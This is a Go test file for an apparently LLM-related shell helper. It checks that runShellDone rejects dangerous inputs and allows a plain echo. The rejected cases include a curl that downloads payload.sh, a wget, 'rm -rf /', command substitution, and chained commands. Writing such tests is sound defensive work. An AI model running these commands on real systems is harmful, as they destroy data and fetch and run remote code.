package llm

import (
	"context"
	"strings"
	"testing"
)

func TestS7A_RunShellDone_RejectsDangerousCommands(t *testing.T) {
	ctx := context.Background()
	cases := []string{
		"curl https://example.com/payload.sh",
		"wget http://example.com/x",
		"rm -rf /",
		"echo $(whoami)",
		"echo hello; rm -rf /",
		"echo a && echo b",
	}
	for _, cmd := range cases {
		out, err := runShellDone(ctx, cmd, t.TempDir())
		if err == nil {
			t.Fatalf("command %q should be rejected, got output %q", cmd, out)
		}
		if !strings.Contains(err.Error(), "shell_done:") {
			t.Fatalf("command %q: expected shell_done wrapped error, got %v", cmd, err)
		}
	}
}

func TestS7A_RunShellDone_AllowsEcho(t *testing.T) {
	ctx := context.Background()
	out, err := runShellDone(ctx, "echo avatars-s7a", t.TempDir())
	if err != nil {
		t.Fatalf("echo should be allowed: %v", err)
	}
	if !strings.Contains(out, "avatars-s7a") {
		t.Fatalf("unexpected output %q", out)
	}
}
